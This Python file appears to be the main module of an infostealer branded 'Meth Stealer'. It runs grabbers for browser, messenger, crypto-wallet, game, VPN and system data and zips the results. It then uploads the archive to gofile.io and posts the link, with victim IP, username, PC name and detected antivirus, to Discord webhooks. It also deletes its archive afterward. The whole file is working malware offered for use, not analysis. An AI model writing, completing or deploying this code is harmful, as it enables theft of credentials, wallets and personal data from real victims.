import os
import zipfile
import requests
import platform
import getpass
import psutil
from datetime import datetime
from pathlib import Path

from core.browser_grabber import main as grab_browsers
from core.messengers_grabber import main as grab_messengers
from core.wallets_grabber import main as grab_wallets
from core.games_grabber import main as grab_games
from core.vpns_grabber import main as grab_vpns
from core.system_grabber import main as grab_system

from config.webhooks import DISCORD_WEBHOOK, FALLBACK_WEBHOOK

WEBHOOKS = [DISCORD_WEBHOOK]
if FALLBACK_WEBHOOK and FALLBACK_WEBHOOK != "YOUR BACKUP WEBHOOK":
    WEBHOOKS.append(FALLBACK_WEBHOOK)

LOG_DIR = Path("METH_LOGS")
ZIP_NAME = "meth_logs.zip"

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "N/A"

def detect_av():
    av_procs = ["msmpeng.exe", "avastsvc.exe", "avgnt.exe", "avguard.exe", "bdagent.exe", "ekrn.exe", "mcshield.exe"]
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and any(av in proc.info['name'].lower() for av in av_procs):
                return proc.info['name']
        except:
            pass
    return "None"

def zip_logs():
    if not LOG_DIR.exists() or not any(LOG_DIR.iterdir()):
        return None
    try:
        with zipfile.ZipFile(ZIP_NAME, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(LOG_DIR):
                for file in files:
                    file_path = Path(root) / file
                    arcname = file_path.relative_to(LOG_DIR)
                    zipf.write(file_path, arcname)
        return ZIP_NAME if os.path.exists(ZIP_NAME) else None
    except:
        return None

def upload_to_gofile(zip_path):
    if not zip_path or not os.path.exists(zip_path):
        return None
    try:
        with open(zip_path, "rb") as f:
            files = {"file": f}
            r = requests.post("https://store1.gofile.io/uploadFile", files=files, timeout=60)
            if r.status_code != 200:
                return None
            data = r.json()
            if data.get("status") != "ok":
                return None
            return f"https://gofile.io/d/{data['data']['code']}"
    except:
        return None

def send_to_webhook(download_link):
    if not download_link:
        return False

    victim_ip = get_public_ip()
    victim_user = getpass.getuser()
    victim_pc = platform.node()
    os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
    av_name = detect_av()
    file_count = len(list(LOG_DIR.glob("*.txt")))
    timestamp_unix = int(datetime.now().timestamp())

    payload = {
        "content": "@everyone **Meth Hit!**",
        "embeds": [{
            "title": "Meth Stealer - Package Delivered",
            "description": f"**Full Logs Archive**\n{download_link}",
            "color": 0xADD8E6,
            "fields": [
                {"name": "🎯 Victim", "value": f"IP: `{victim_ip}`\nUser: `{victim_user}`\nPC: `{victim_pc}`", "inline": True},
                {"name": "💻 System", "value": f"OS: `{os_info}`\nAV: `{av_name}`", "inline": True},
                {"name": "📊 Stats", "value": f"Files: `{file_count}`\nCaptured: <t:{timestamp_unix}:R>", "inline": False},
            ],
            "footer": {"text": "Meth • 2026 • Untraceable"},
            "timestamp": datetime.utcnow().isoformat()
        }]
    }

    for webhook in WEBHOOKS:
        try:
            r = requests.post(webhook, json=payload, timeout=20)
            if r.status_code in (200, 204):
                return True
        except:
            pass
    return False

def main():
    grab_browsers()
    grab_messengers()
    grab_wallets()
    grab_games()
    grab_vpns()
    grab_system()

    zip_path = zip_logs()
    if not zip_path:
        return

    link = upload_to_gofile(zip_path)
    if link:
        send_to_webhook(link)

    try:
        os.remove(zip_path)
    except:
        pass

if __name__ == "__main__":
    main()
